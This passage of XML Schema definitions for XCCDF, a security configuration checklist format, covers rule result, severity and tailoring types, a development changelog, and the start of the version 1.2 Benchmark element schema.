                present merely to convey diagnostic information from the checking engine. Benchmark
                consumers may choose to log these messages or display them to the user.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:string">
            <xsd:enumeration value="error">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Denotes a serious problem identified; test did
                        not run. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="warning">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Denotes a possible issue; test may not have
                        run. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="info">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Denotes important information about the tests.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:simpleType name="resultEnumType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Allowed result indicators for a
                test.</xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:string">
            <xsd:enumeration value="pass">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The target system or system component satisfied
                        all the conditions of the &lt;xccdf:Rule&gt;. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="fail">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The target system or system component did not
                        satisfy all the conditions of the &lt;xccdf:Rule&gt;. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="error">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The checking engine could not complete the
                        evaluation; therefore the status of the target’s compliance with the
                        &lt;xccdf:Rule&gt; is not certain. This could happen, for example, if a
                        testing tool was run with insufficient privileges and could not gather all
                        of the necessary information. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="unknown">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The testing tool encountered some problem and
                        the result is unknown. For example, a result of ‘unknown’ might be given if
                        the testing tool was unable to interpret the output of the checking engine
                        (the output has no meaning to the testing tool). </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="notapplicable">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The &lt;xccdf:Rule&gt; was not applicable to
                        the target of the test. For example, the &lt;xccdf:Rule&gt; might have been
                        specific to a different version of the target OS, or it might have been a
                        test against a platform feature that was not installed. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="notchecked">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The &lt;xccdf:Rule&gt; was not evaluated by the
                        checking engine. This status is designed for &lt;xccdf:Rule&gt; elements
                        that have no check. It may also correspond to a status returned by a
                        checking engine if the checking engine does not support the indicated check
                        code. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="notselected">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The &lt;xccdf:Rule&gt; was not selected in the
                        &lt;xccdf:Benchmark&gt;. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="informational">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The &lt;xccdf:Rule&gt; was checked, but the
                        output from the checking engine is simply information for auditors or
                        administrators; it is not a compliance category. This status value is
                        designed for &lt;xccdf:Rule&gt; elements whose main purpose is to extract
                        information from the target rather than test the target.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="fixed">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The &lt;xccdf:Rule&gt; had failed, but was then
                        fixed (possibly by a tool that can automatically apply remediation, or
                        possibly by the human auditor). </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:simpleType name="severityEnumType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Allowed severity values for the @severity attribute of
                an &lt;xccdf:Rule&gt;. The value of this attribute provides an indication of the
                importance of the &lt;xccdf:Rule&gt; element's recommendation. This information is
                informative only and does not affect scoring.</xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:string">
            <xsd:enumeration value="unknown">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Severity not defined (default).
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="info">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">&lt;xccdf:Rule&gt; is informational and failure
                        does not represent a problem. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="low">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Not a serious problem. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="medium">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Fairly serious problem. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="high">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A grave or critical problem.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:simpleType name="roleEnumType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Allowed checking and scoring roles for an
                &lt;xccdf:Rule&gt;.</xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:string">
            <xsd:enumeration value="full">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">If the &lt;xccdf:Rule&gt; is selected, then
                        check it and let the result contribute to the score and appear in reports
                        (default). </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="unscored">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">If the &lt;xccdf:Rule&gt; is selected, then
                        check it and include it in the test report, but give the result a status of
                        informational and do not use the result in score computations.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="unchecked">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Do not check the &lt;xccdf:Rule&gt;; just force
                        the result status to notchecked. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:simpleType name="subUseEnumType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">This holds the possible values of the @use attribute
                within an &lt;xccdf:sub&gt; element. The @use attribute is only applicable with the
                subType's @idref attribute holds the value of the @id of an &lt;xccdf:Value&gt;
                element.</xsd:documentation>
        </xsd:annotation>
        <xsd:restriction base="xsd:string">
            <xsd:enumeration value="value">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Replace with the selected &lt;xccdf:value&gt;
                        or &lt;xccdf:complex-value&gt; of an &lt;xccdf:Value&gt;.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="title">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Replace with the &lt;xccdf:title&gt; of the
                        &lt;xccdf:Value&gt;. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
            <xsd:enumeration value="legacy">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Use the context-dependent processing of
                        &lt;xccdf:sub&gt; elements outlined in XCCDF 1.1.4. </xsd:documentation>
                </xsd:annotation>
            </xsd:enumeration>
        </xsd:restriction>
    </xsd:simpleType>

    <xsd:element name="Tailoring" type="cdf:tailoringType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">The &lt;xccdf:Tailoring&gt; element holds one or more
                &lt;xccdf:Profile&gt; elements. These &lt;xccdf:Profile&gt; elements record
                additional tailoring activities that apply to a given &lt;xccdf:Benchmark&gt;.
                &lt;xccdf:Tailoring&gt; elements are separate from &lt;xccdf:Benchmark&gt;
                documents, but each &lt;xccdf:Tailoring&gt; element is associated with a specific
                &lt;xccdf:Benchmark&gt; document. By defining these tailoring actions separately
                from the &lt;xccdf:Benchmark&gt; document to which they apply, these actions can be
                recorded without affecting the integrity of the source itself.</xsd:documentation>
        </xsd:annotation>
    </xsd:element>

    <xsd:complexType name="tailoringType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Data type for the &lt;xccdf:Tailoring&gt; element. The
                &lt;xccdf:Tailoring&gt; element allows named tailorings (i.e., &lt;xccdf:Profile&gt;
                elements) of an &lt;xccdf:Benchmark&gt; to be defined separately from the
                &lt;xccdf:Benchmark&gt; itself. The &lt;xccdf:Profile&gt; elements in an
                &lt;xccdf:Tailoring&gt; element can be used in two ways: First, an organization
                might wish to pre-define a set of tailoring actions to be applied on top of or
                instead of the tailoring performed by an &lt;xccdf:Benchmark&gt; element's
                &lt;xccdf:Profile&gt; elements. Second, an &lt;xccdf:Tailoring&gt; element can be
                used to record manual tailoring actions performed during the course of an
                assessment. </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element name="benchmark" minOccurs="0" maxOccurs="1"
                type="cdf:tailoringBenchmarkReferenceType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Identifies the &lt;xccdf:Benchmark&gt; to which
                        this tailoring applies. A &lt;xccdf:Tailoring&gt; document is only
                        applicable to a single &lt;xccdf:Benchmark&gt;. Note, however, that this is
                        a purely informative field. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element ref="cdf:status" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Status of the tailoring and date at which it
                        attained that status. Authors may use this element to record the maturity or
                        consensus level of an &lt;xccdf:Tailoring&gt; element.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="dc-status" minOccurs="0" maxOccurs="unbounded"
                type="cdf:dc-statusType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Holds additional status information using the
                        Dublin Core format. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="version" minOccurs="1" maxOccurs="1" type="cdf:tailoringVersionType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The version of this &lt;xccdf:Tailoring&gt;
                        element, with a required @time attribute that records when the
                        &lt;xccdf:Tailoring&gt; element was created. This timestamp is necessary
                        because, under some circumstances, a copy of an &lt;xccdf:Tailoring&gt;
                        document might be automatically generated. Without the version and
                        timestamp, tracking of these automatically created &lt;xccdf:Tailoring&gt;
                        documents could become problematic. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="metadata" type="cdf:metadataType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">XML metadata for the &lt;xccdf:Tailoring&gt;
                        element. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element ref="cdf:Profile" minOccurs="1" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">&lt;xccdf:Profile&gt; elements that reference
                        and customize sets of items in an &lt;xccdf:Benchmark&gt;.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="signature" type="cdf:signatureType" minOccurs="0" maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A digital signature asserting authorship and
                        allowing verification of the integrity of the &lt;xccdf:Tailoring&gt;.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:sequence>
        <xsd:attribute name="id" type="cdf:tailoringIdType" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Unique identifier for this
                    element.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <!-- the 'Id' attribute is needed for XML-Signature -->
        <xsd:attribute name="Id" type="xsd:ID" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">An identifier used for referencing elements
                    included in an XML signature. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="tailoringBenchmarkReferenceType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Identifies the &lt;xccdf:Benchmark&gt; to which an
                &lt;xccdf:Tailoring&gt; element applies. </xsd:documentation>
        </xsd:annotation>
        <xsd:complexContent>
            <xsd:extension base="cdf:benchmarkReferenceType">
                <xsd:attribute name="version" type="xsd:string" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Identifies the version of the referenced
                            &lt;xccdf:Benchmark&gt;. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:complexContent>
    </xsd:complexType>

    <xsd:complexType name="tailoringVersionType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Type for version information about an
                &lt;xccdf:Tailoring&gt; element. </xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:string">
                <xsd:attribute name="time" type="xsd:dateTime" use="required">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The time when this version of the
                            &lt;xccdf:Tailoring&gt; document was completed. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>

</xsd:schema>
<!-- CHANGELOG

 date           change                  remarks

6/20/05         added cdf:ident         long-term identifiers for Rule
                                        and rule-result.

6/21/05         enhanced version        added version attr to TestResult
                                        and rule-result, too

                added notapplicable     added new rule result value

                added severity          enum and attributes

6/22/05         added signatures for    need for standalone Rules & such
                Rule,Group,Value,
                Profile,TestResult

6/22/05         added rule roles        at Dave's request

6/23/05         added rule result       at DISA request
                overrides

6/26/05         added fixtext and       enums for attributes
                fix enhancements

6/29/05         added interactive       run-time tailoring for Values
                attr on Value object

6/29/05         added multiple scoring  was this a Dave request?
                model support

7/1/05          added support for       to support text re-use
                named plain text blocks

7/7/05          added target-facts      DISA suggestion

7/13/05         added complex-checks    workshop suggestion, allow
                                        boolean combinations of 
                                        checks.

7/29/05         added more rule         some suggested by CIS
                result types

8/4/05          added override attrs    suggested by Dave W.
                for managing inheritance

8/20/05         added fix strategies

8/20/05         revamped complex-check  see OVAL schema
                to more closely match
                OVAL boolean operators

9/4/05          fixed some typos

9/8/05          Added fix/fixtext       suggested by Dave W.
                complexity and warning
                categories.

9/18/05         Allow for XCCDF-P as    see XCCDF-P document
                a platform type.        (later deprecated)

9/21/05         Added profile-note      suggested by Dave W.
                support.

11/10/05        Added additional features   also from Dave W.
                for Values.

11/27/05        Added instance context   to meet CIS req'ts
                support

11/27/05        Added multiple hint on   to meet CIS req'ts
                Rule object

11/27/05        fixed role attr on       old bug
                Rule object

12/5/05         fixed 1.0-incompatible    reported by Nancy W
                order glitch in Profile

4/16/06         beginning work toward     reports from Ian C
                1.1bis; fixed several 
                small mistakes/glitches.

4/23/06         tweaked formatting        various e-mails
                fixed some comments
                version # to 1.1.2.1

4/30/06         fixed plain-text id       report from Dave W.
                key and sub key ref

5/5/06          fixed extends keyrefs     report from Dave W.

5/21/06         added id attribute to     request from CIS
                check element

8/27/06         changed TestResult to     bug discovered myself
                allow target to appear
                multiple times

11/20/06        Fixed weightType          report from Gary Gapinski

12/13/06        Changed platform          support for CPE
                references to URIs

12/13/06        Changed requires element  request from NIST
                to a token list

12/28/06        Changed check element to   backfit to NIST 
                allow multiple            change by Linda Devlin
                check-content-ref

8/21/07         Added check-import        better reporting, req.
                element                   by NIST & MITRE

8/26/07         Added remark element      allow authors to add
                to Profile selectors      rationale to Profiles

8/26/07         Added weight to rule      record weight used in
                result element            a benchmark run

8/30/07         Added impact-metric       mechanism to include a
                element to Rule           CVSS score in a Rule

8/30/07         Changed CPE support       Match SCAP 1.0
                to CPE 2.0
9/10/07         Made CPE 1.0 deprecated   Match SCAP 1.0

10/8/07         Allow Profile selectors   Part of clarifying Profile
                in any order              semantics for 1.1.4

10/8/07         Added Benchmark style     For NIST SCAP
                and style-href attrs

10/8/07         Added organization and    For NIST SCAP
                identity elements for
                TestResult

6/1/10          Made platform element       Fix to match spec
                Profile overridable
               
6/1/10          Added metadata fields       Community request for
                to TestResults, Profiles    more flexible metadata
                and Items. Also opened
                metadata fields to all
                content.

6/1/10          Updated to use CPE 2.3      Bring into line with SCAP
                Also changed CPE fields
                from URIs to strings.
                
6/1/10          Added negate field to       Support inverting of SCAP
                check element.              result mappings

6/1/10          Added dc-status field       Allow Dublin-Core status info

6/1/10          Added multi-check to        Allows creation of rule-results
                Rules                       for each check used

6/1/10          Expanded selector           Enforce requirements from spec 
                uniqueness constraints 
                within Values
                
6/1/10          Expanded Value to           Bring XCCDF more in line with
                allow lists and externally  capabilities of checking languages
                defined types. Updated
                Profile selectors and
                TestResults to handle the
                new constructs

6/1/10          Added import-xpath to       Expand import capabilities
                check-import. Also updated
                check-import to allow
                XML-structured findings
                
6/1/10          Fixed path of Benchmark's   Bug fix.
                profileIdKeyRef restriction
                
6/1/10          Added an id field to        Better reference to the XCCDF source 
                TestResult/benchmark
                
5/27/11         Added reference to Asset    More standards based target identification 
                Identification structures
                in TestResults.
                
5/27/11         Added ComplexChecks in      Better tracking of result structures during complex checks 
                rule-results
-->
</file>

<file path="sample_data/test_files/medium/xsd/xccdf_1.2.xsd">
<?xml version="1.0" encoding="UTF-8"?>
<xsd:schema xmlns:xsd="http://www.w3.org/2001/XMLSchema"
    xmlns:cdf="http://checklists.nist.gov/xccdf/1.2" xmlns:cpe2="http://cpe.mitre.org/language/2.0"
    targetNamespace="http://checklists.nist.gov/xccdf/1.2" elementFormDefault="qualified"
    attributeFormDefault="unqualified" version="1.2.1">

    <xsd:annotation>
        <xsd:documentation xml:lang="en"> This schema defines the Extensible Configuration Checklist
            Description Format (XCCDF), a data format for defining security benchmarks and
            checklists, and for recording the results of applying such benchmarks. For more
            information, consult the specification document, NIST Interagency Report 7275 Revision
            4, "Specification for the Extensible Configuration Checklist Description Format Version
            1.2". This schema was developed by Neal Ziring, with ideas and assistance from David
            Waltermire. The following helpful individuals also contributed ideas to the definition
            of this schema: David Proulx, Andrew Buttner, Ryan Wilson, Matthew Kerr, and Stephen
            Quinn. Ian Crawford found numerous discrepancies between this schema and the spec
            document. Peter Mell and his colleagues also made many suggestions. </xsd:documentation>
        <xsd:appinfo>
            <schema>XCCDF Language</schema>
            <author>Neal Ziring</author>
            <version>1.2</version>
            <date>2012-02-23</date>
        </xsd:appinfo>
    </xsd:annotation>

    <!-- Import base XML namespace -->
    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" schemaLocation="https://www.w3.org/2009/01/xml.xsd">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Import the XML namespace because this schema uses the
                @xml:lang and @xml:base attributes. </xsd:documentation>
        </xsd:annotation>
    </xsd:import>

    <!-- Import CPE 2.3 Language namespace -->
    <xsd:import namespace="http://cpe.mitre.org/language/2.0" schemaLocation="/schema/cpe/2.3/cpe-language_2.3.xsd">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Import the Common Platform Enumeration language
                schema, which can be used for defining compound CPE tests for complex IT platforms
                in the &lt;xccdf:Benchmark&gt;. For more info see NIST IRs 7695-7698, the
                specification documents for CPE version 2.3. </xsd:documentation>
        </xsd:annotation>
    </xsd:import>

    <!-- ************************************************************** -->
    <!-- *****************  Benchmark Element  ************************ -->
    <!-- ************************************************************** -->
    <xsd:element name="Benchmark">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> This is the root element of the XCCDF document; it
                must appear exactly once. It encloses the entire benchmark, and contains both
                descriptive information and structural information. Note that the order of
                &lt;xccdf:Group&gt; and &lt;xccdf:Rule&gt; child elements may matter for the
                appearance of a generated document. &lt;xccdf:Group&gt; and &lt;xccdf:Rule&gt;
                children may be freely intermingled, but they must appear after any
                &lt;xccdf:Value&gt; children. All the other children must appear in the order
                shown.</xsd:documentation>
        </xsd:annotation>
        <xsd:complexType>
            <xsd:sequence>
                <xsd:element ref="cdf:status" minOccurs="1" maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Status of the &lt;xccdf:Benchmark&gt;
                            indicating its level of maturity or consensus. If more than one
                            &lt;xccdf:status&gt; element appears, the element's @date attribute
                            should be included.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="dc-status" minOccurs="0" maxOccurs="unbounded"
                    type="cdf:dc-statusType">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Holds additional status information using
                            the Dublin Core format.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="title" type="cdf:textType" minOccurs="0" maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Title of the &lt;xccdf:Benchmark&gt;; an
                            &lt;xccdf:Benchmark&gt; should have an
                            &lt;xccdf:title&gt;.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="description" type="cdf:htmlTextWithSubType" minOccurs="0"
                    maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Text that describes the
                            &lt;xccdf:Benchmark&gt;; an &lt;xccdf:Benchmark&gt; should have an
                            &lt;xccdf:description&gt;.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="notice" type="cdf:noticeType" minOccurs="0" maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Legal notices (licensing information, terms
                            of use, etc.), copyright statements, warnings, and other advisory
                            notices about this &lt;xccdf:Benchmark&gt; and its
                            use.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="front-matter" type="cdf:htmlTextWithSubType" minOccurs="0"
                    maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Introductory matter for the beginning of
                            the &lt;xccdf:Benchmark&gt; document; intended for use during Document
                            Generation.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="rear-matter" type="cdf:htmlTextWithSubType" minOccurs="0"
                    maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Concluding material for the end of the
                            &lt;xccdf:Benchmark&gt; document; intended for use during Document
                            Generation.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="reference" type="cdf:referenceType" minOccurs="0"
                    maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Supporting references for the
                            &lt;xccdf:Benchmark&gt; document.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="plain-text" type="cdf:plainTextType" minOccurs="0"
                    maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Definitions for reusable text blocks, each
                            with a unique identifier.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element ref="cpe2:platform-specification" minOccurs="0" maxOccurs="1">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">A list of identifiers for complex platform
                            definitions, written in CPE applicability language format. Authors may
                            define complex platforms within this element, and then use their locally
                            unique identifiers anywhere in the &lt;xccdf:Benchmark&gt; element in
                            place of a CPE name.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="platform" type="cdf:CPE2idrefType" minOccurs="0"
                    maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Applicable platforms for this
                            &lt;xccdf:Benchmark&gt;. Authors should use the element to identify the
                            systems or products to which the &lt;xccdf:Benchmark&gt;
                            applies.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="version" type="cdf:versionType" minOccurs="1" maxOccurs="1">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Version number of the
                            &lt;xccdf:Benchmark&gt;.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="metadata" type="cdf:metadataType" minOccurs="0"
                    maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">XML metadata for the
                            &lt;xccdf:Benchmark&gt;. Metadata allows many additional pieces of
                            information, including authorship, publisher, support, and other similar
                            details, to be embedded in an
                            &lt;xccdf:Benchmark&gt;.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element ref="cdf:model" minOccurs="0" maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">URIs of suggested scoring models to be used
                            when computing a score for this &lt;xccdf:Benchmark&gt;. A suggested
                            list of scoring models and their URIs is provided in the XCCDF
                            specification.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element ref="cdf:Profile" minOccurs="0" maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">&lt;xccdf:Profile&gt; elements that
                            reference and customize sets of items in the
                            &lt;xccdf:Benchmark&gt;.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element ref="cdf:Value" minOccurs="0" maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Parameter &lt;xccdf:Value&gt; elements that
                            support &lt;xccdf:Rule&gt; elements and descriptions in the
                            &lt;xccdf:Benchmark&gt;. </xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:choice minOccurs="0" maxOccurs="unbounded">
                    <xsd:element ref="cdf:Group">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">&lt;xccdf:Group&gt; elements that
                                comprise the &lt;xccdf:Benchmark&gt;; each may contain additional
                                &lt;xccdf:Value&gt;, &lt;xccdf:Rule&gt;, and other
                                &lt;xccdf:Group&gt; elements. </xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                    <xsd:element ref="cdf:Rule">
                        <xsd:annotation>
                            <xsd:documentation xml:lang="en">&lt;xccdf:Rule&gt; elements that
                                comprise the &lt;xccdf:Benchmark&gt;.</xsd:documentation>
                        </xsd:annotation>
                    </xsd:element>
                </xsd:choice>
                <xsd:element ref="cdf:TestResult" minOccurs="0" maxOccurs="unbounded">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">&lt;xccdf:Benchmark&gt; test result records
                            (one per &lt;xccdf:Benchmark&gt; run).</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="signature" type="cdf:signatureType" minOccurs="0" maxOccurs="1">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">A digital signature asserting authorship
                            and allowing verification of the integrity of the
                            &lt;xccdf:Benchmark&gt;.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
            </xsd:sequence>
            <xsd:attribute name="id" type="cdf:benchmarkIdType" use="required">
                <xsd:annotation>
                    <xsd:documentation>Unique &lt;xccdf:Benchmark&gt;
                        identifier.</xsd:documentation>
                </xsd:annotation>
            </xsd:attribute>
            <xsd:attribute name="Id" type="xsd:ID" use="optional">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">An identifier used for referencing elements
                        included in an XML signature.</xsd:documentation>
                </xsd:annotation>
            </xsd:attribute>
            <xsd:attribute name="resolved" type="xsd:boolean" default="false" use="optional">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">True if &lt;xccdf:Benchmark&gt; has already
                        undergone the resolution process.</xsd:documentation>
                </xsd:annotation>
            </xsd:attribute>
            <xsd:attribute name="style" type="xsd:string" use="optional">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Name of an &lt;xccdf:Benchmark&gt; authoring
                        style or set of conventions or constraints to which this
                        &lt;xccdf:Benchmark&gt; conforms (e.g., “SCAP 1.2”).</xsd:documentation>
                </xsd:annotation>
            </xsd:attribute>
            <xsd:attribute name="style-href" type="xsd:anyURI" use="optional">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">URL of a supplementary stylesheet or schema
                        extension that can be used to verify conformance to the named
                        style.</xsd:documentation>
                </xsd:annotation>
            </xsd:attribute>
            <xsd:attribute ref="xml:lang"/>
        </xsd:complexType>

        <xsd:unique name="noticeIdUnique">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> Legal notices must have unique id values.
                </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath="cdf:notice"/>
            <xsd:field xpath="@id"/>
        </xsd:unique>

        <xsd:key name="itemIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> Items must have unique id values, and also they
                    must not collide. </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath=".//cdf:Value|.//cdf:Group|.//cdf:Rule|./cdf:plain-text"/>
            <xsd:field xpath="@id"/>
        </xsd:key>

        <xsd:key name="modelSystemKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> Model system attributes must be unique.
                </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath="./cdf:model"/>
            <xsd:field xpath="@system"/>
        </xsd:key>

        <xsd:key name="valueIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> &lt;xccdf:Value&gt; item ids are special keys,
                    need this for the valueIdKeyRef and valueExtIdKeyRef keyrefs below.
                </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath=".//cdf:Value"/>
            <xsd:field xpath="@id"/>
        </xsd:key>

        <xsd:key name="groupIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> &lt;xccdf:Group&gt; item ids are special keys,
                    need this for the groupIdKeyRef keyref below. </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath=".//cdf:Group"/>
            <xsd:field xpath="@id"/>
        </xsd:key>

        <xsd:key name="ruleIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> &lt;xccdf:Rule&gt; items have a unique key, we
                    need this for the ruleIdKeyRef keyref below. (&lt;xccdf:Rule&gt; key refs are
                    used by &lt;xccdf:rule-result&gt; elements.) </xsd:documentation>
            </xsd:annotation>
            <xsd:selector xpath=".//cdf:Rule"/>
            <xsd:field xpath="@id"/>
        </xsd:key>

        <xsd:key name="selectableItemIdKey">
            <xsd:annotation>
                <xsd:documentation xml:lang="en"> &lt;xccdf:Group&gt; and &lt;xccdf:Rule&gt; item
                    ids are special keys, we need this for the requiresIdKeyRef keyref below.
